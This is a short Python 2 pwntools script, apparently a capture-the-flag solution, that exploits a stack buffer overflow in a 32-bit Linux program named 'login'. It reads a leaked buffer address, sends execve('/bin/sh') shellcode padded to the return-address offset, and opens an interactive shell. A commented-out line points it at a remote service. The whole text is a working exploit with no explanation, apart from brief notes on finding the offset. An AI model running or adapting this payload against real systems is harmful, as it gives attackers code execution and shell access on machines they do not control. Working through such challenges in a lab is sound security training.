#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import struct
context(arch='i386', os='linux')

#io = remote('10.0.10.1', 31337)
io = process('./login')

psw_addr = int(io.recvuntil(")")[-11:-1], 16)
#print hex(psw_addr)

# pattern_create 100
#Â run in gdb with pattern as input
#pattern_offset 0x48414132

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
print len(shellcode + 'A'*(60-len(shellcode)) + p32(psw_addr)) # we want it ==64
io.send(shellcode + 'A'*(60-len(shellcode)) + p32(psw_addr)+"\n")

io.interactive()
